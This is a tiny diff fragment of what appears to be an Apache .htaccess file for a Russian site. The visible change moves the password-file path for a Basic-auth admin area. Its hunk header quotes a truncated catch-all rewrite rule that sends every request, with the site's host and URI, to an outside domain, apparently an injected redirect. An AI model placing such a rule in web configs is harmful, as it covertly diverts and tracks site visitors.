@@ -8,4 +8,4 @@ RewriteRule .* http://unem3lx.dumb1.com/wstat/accepter.php?h=%{HTTP_HOST}&u=%{RE
 AuthType Basic  
 AuthName Admin
 require valid-user 
-AuthUserFile  /home/u178448/bereg-cn.ru/www/backup/.htpasswd
+AuthUserFile  /home/vingsite/public_html/bereg-cn.ru/backup/.htpasswd
